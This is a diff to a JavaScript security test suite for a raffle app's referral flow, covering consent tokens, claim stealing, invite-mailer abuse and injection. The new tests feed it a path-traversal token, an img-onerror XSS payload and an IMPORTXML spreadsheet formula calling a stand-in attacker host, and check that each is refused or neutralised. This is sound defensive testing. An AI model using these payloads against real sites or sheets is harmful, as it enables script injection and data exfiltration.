@@ -28,7 +28,8 @@
  *   T6  Header/protocol injection into the outbound email and the FUB API.
  *   T7  Verification bypass -- entering without ever proving the email.
  */
-const { makeSandbox, at, entry, enterFull, J, DURING, BEFORE } = require('./harness');
+const { makeSandbox, at, entry, enterFull, J, DURING, BEFORE, AFTER } = require('./harness');
+const AFTER_CLOSE = AFTER;
 
 let fails = 0, passes = 0;
 function check(name, cond, detail) {
@@ -392,9 +393,17 @@ section('T7  Verification bypass');
   const vr = req(v, entry({ fullName: 'Real Name', email: 'real@mail-test.co',
                             phone: '(215) 555-8802' }), DURING);
   const code = String(v.__sent[v.__sent.length - 1].subject).match(/(\d{6})/)[1];
-  at(DURING, () => v.raffleHandleSubmission_({
+  const sess = J(at(DURING, () => v.raffleHandleSubmission_({
     step: 'verify', vid: vr.vid, code: code,
-    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000' }));
+    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000' })));
+  // The row is written at the REFERRAL step now, so the swap is attempted again
+  // there -- that is where it would actually have to succeed to do any damage.
+  at(DURING, () => v.raffleHandleSubmission_({
+    step: 'referral', vid: sess.vid, consent: 'Yes',
+    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000',
+    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
+    referralPhone: '(215) 555-9001', referralRole: 'Buyer',
+    referralTimeframe: '7-12 Months' }));
   const w = v.__data('Entries')[0];
   check('the verified (cached) email is written, not the one re-posted',
     !!w && w[2] === 'real@mail-test.co', JSON.stringify(w && w[2]));
@@ -408,6 +417,184 @@ section('T7  Verification bypass');
                         phone: '(215) 555-89' + (10 + i), consent: c }, DURING);
     check('consent value ' + JSON.stringify(c) + ' is refused', !(r && r.ok));
   });
+}
+
+// ---------------------------------------------------------------------------
+section('T8  Referral entry: consent tokens, claims and the invite mailer');
+// ---------------------------------------------------------------------------
+// New surface as of 2026-09-17. An entry now depends on a THIRD PARTY acting,
+// which adds three things an attacker can reach for: the consent token (a bearer
+// credential sitting in somebody else's inbox), the claim on a referred person
+// (worth stealing, because only the first claim counts), and the invite email
+// (a second way to make this endpoint mail a stranger).
+const { verifySession, referral } = require('./harness');
+
+const stage = (s, who, ref, when) => {
+  const v = verifySession(s, entry(who), when || DURING);
+  if (!v || !v.vid) return { v: v };
+  const st = J(at(when || DURING, () => s.raffleHandleSubmission_(
+    Object.assign({ step: 'referral', vid: v.vid }, referral(ref)))));
+  return { v: v, staged: st };
+};
+
+{
+  // -- the consent token must be unguessable and must not be a free-form id.
+  const s = makeSandbox();
+  const a = stage(s, {}, {}, DURING);
+  check('a referral stages a token', /^[0-9a-fA-F-]{36}$/.test(String(a.staged.token)),
+    JSON.stringify(a.staged));
+
+  ['', 'x', '1', '../../etc/passwd', 'a'.repeat(200), '{}',
+   '11111111-1111-4111-8111-111111111111'].forEach((bad, i) => {
+    const r = J(at(DURING, () => s.raffleHandleSubmission_({
+      step: 'consent', decision: 'confirm', token: bad, consent: 'Yes',
+      referralName: 'Mal Ory', referralEmail: 'mal@mail-test.co',
+      referralPhone: '(215) 555-9500', referralRole: 'Buyer' })));
+    check('forged consent token ' + i + ' is refused', !(r && r.ok), JSON.stringify(r));
+  });
+  check('no row became eligible from a forged token',
+    s.__data('Entries').filter(r => String(r[11]) === 'eligible').length === 0);
+
+  // -- consent cannot be spoofed with a truthy non-'Yes'.
+  ['no', '', 'true', '1', undefined].forEach((c, i) => {
+    const r = J(at(DURING, () => s.raffleHandleSubmission_({
+      step: 'consent', decision: 'confirm', token: a.staged.token, consent: c,
+      referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
+      referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));
+    check('consent value ' + JSON.stringify(c) + ' is refused at the consent page',
+      !(r && r.ok), JSON.stringify(r));
+  });
+}
+
+{
+  // -- claim stealing. Only the first entrant to get a referral confirmed gets
+  //    the entry, so the second must not be able to take it by racing or by
+  //    editing the address on the consent page.
+  const s = makeSandbox();
+  const a = stage(s, {}, {}, DURING);
+  const b = stage(s, { fullName: 'Second Entrant', email: 'second@mail-test.co',
+                       phone: '(267) 555-8210' },
+                     { referralName: 'Other Person', referralEmail: 'other@mail-test.co',
+                       referralPhone: '(215) 555-9200' }, DURING);
+  check('two different referrals both stage', !!a.staged.staged && !!b.staged.staged);
+
+  // A consents normally.
+  J(at(DURING, () => s.raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: a.staged.token, consent: 'Yes',
+    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
+    referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));
+
+  // B's referral now edits their own details on the consent page to impersonate
+  // A's referral -- the one address the submit-time check could not have seen.
+  const steal = J(at(DURING, () => s.raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: b.staged.token, consent: 'Yes',
+    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
+    referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));
+  check('a second claim on the same person does not become an entry',
+    !!(steal && steal.superseded), JSON.stringify(steal));
+  const eligible = s.__data('Entries').filter(r => String(r[11]) === 'eligible');
+  check('exactly one eligible row for that referred person', eligible.length === 1,
+    'got ' + eligible.length);
+
+  // And the draw must agree with the sheet.
+  const drawn = at(AFTER_CLOSE, () => s.raffleDrawWinner_(false, true));
+  check('the draw sees exactly one entry', drawn.ok && drawn.result.totalEligible === 1,
+    JSON.stringify(drawn && drawn.result && drawn.result.totalEligible));
+}
+
+{
+  // -- the invite is a mailer. It must not be re-triggerable, and a token must
+  //    not be usable from someone else's session.
+  const s = makeSandbox();
+  const a = stage(s, {}, {}, DURING);
+  const before = s.__sent.length;
+  const first = J(at(DURING, () => s.raffleHandleSubmission_(
+    { step: 'invite', vid: a.v.vid, token: a.staged.token })));
+  check('the invite sends once', !!(first && first.sent));
+  let resends = 0;
+  for (let i = 0; i < 5; i++) {
+    const r = J(at(DURING, () => s.raffleHandleSubmission_(
+      { step: 'invite', vid: a.v.vid, token: a.staged.token })));
+    if (r && r.sent) resends++;
+  }
+  check('the invite cannot be re-sent by pressing the button again', resends === 0);
+  const toReferral = s.__sent.slice(before).filter(m => m.to === 'robin@mail-test.co');
+  check('the referred person got exactly one email', toReferral.length === 1,
+    'got ' + toReferral.length);
+
+  // Durand, 2026-09-17: "put both the entrant and referral on the email."
+  const invite = toReferral[0];
+  check('the entrant is copied on the invite',
+    String(invite.cc || '').indexOf('dana@mail-test.co') !== -1, String(invite.cc));
+  check('info@ is copied on the invite',
+    String(invite.cc || '').indexOf('info@tsg.homes') !== -1, String(invite.cc));
+  check('replies go to the entrant, not to a noreply address',
+    String(invite.replyTo || '') === 'dana@mail-test.co', String(invite.replyTo));
+  check('the invite leads with who referred them',
+    /Dana Reid referred you/.test(String(invite.subject)), String(invite.subject));
+
+  // A token from another entrant's session must not send anything.
+  const other = verifySession(s, entry({ fullName: 'Nosy Person',
+    email: 'nosy@mail-test.co', phone: '(267) 555-8220' }), DURING);
+  const hijack = J(at(DURING, () => s.raffleHandleSubmission_(
+    { step: 'invite', vid: other.vid, token: a.staged.token })));
+  check("another entrant cannot drive someone else's invite", !(hijack && hijack.sent),
+    JSON.stringify(hijack));
+}
+
+{
+  // -- HTML injection into the invite email and the consent page. Both render
+  //    entrant-controlled text, so both are sinks like the admin pages were.
+  const s = makeSandbox();
+  const payload = '<img src=x onerror=alert(1)>';
+  const a = stage(s, { fullName: payload + ' Entrant' },
+                     { referralName: payload + ' Referral' }, DURING);
+  J(at(DURING, () => s.raffleHandleSubmission_(
+    { step: 'invite', vid: a.v.vid, token: a.staged.token })));
+  const mail = s.__sent.filter(m => /referred you/.test(String(m.subject))).pop();
+  check('an invite was produced (setup)', !!mail);
+  check('the invite HTML does not carry the raw payload',
+    !!mail && String(mail.htmlBody).indexOf(payload) === -1,
+    'raw payload found in the invite email');
+
+  const page = String(at(DURING, () => s.raffleConsentPage_(
+    { parameter: { t: a.staged.token } })));
+  check('the consent page does not carry the raw payload',
+    page.indexOf(payload) === -1, 'raw payload found on the consent page');
+  check('the consent page emits no injected tag',
+    !/<(script|img|svg|iframe|object|embed)\b/i.test(page));
+
+  // And the sheet cells written from the consent page are formula-safe too.
+  J(at(DURING, () => s.raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: a.staged.token, consent: 'Yes',
+    referralName: '=IMPORTXML("https://evil.example","//a") Person',
+    referralEmail: 'robin@mail-test.co', referralPhone: '(215) 555-9001',
+    referralRole: 'Buyer', referralTimeframe: '7-12 Months' })));
+  const row = s.__data('Entries')[0].map(String);
+  const live = row.filter(c => /^[=+\-@]/.test(c.trim()));
+  check('no consent-page value becomes a live formula', live.length === 0,
+    JSON.stringify(live));
+}
+
+{
+  // -- an expired/unknown token must not reveal anything, and declining must be
+  //    recorded rather than silently dropped.
+  const s = makeSandbox();
+  const page = String(at(DURING, () => s.raffleConsentPage_(
+    { parameter: { t: '11111111-1111-4111-8111-111111111111' } })));
+  check('an unknown token renders a neutral expired page', /expired/i.test(page));
+  check('and names nobody', !/@mail-test\.co/.test(page));
+
+  const a = stage(s, {}, {}, DURING);
+  const declined = J(at(DURING, () => s.raffleHandleSubmission_(
+    { step: 'consent', decision: 'decline', token: a.staged.token })));
+  check('a decline is accepted', !!(declined && declined.declined));
+  check('a declined row is not eligible',
+    s.__data('Entries').filter(r => String(r[11]) === 'eligible').length === 0);
+  const put = s.__fetches.filter(f => /\/v1\/people\/\d+$/.test(f.url) &&
+                                      f.o && f.o.method === 'put').pop();
+  check('the decline is written to FUB as do-not-contact',
+    !!put && /Do Not Contact/.test(String(put.o.payload)), put && put.o.payload);
 }
 
 console.log('\n' + passes + ' passed, ' + fails + ' failed');
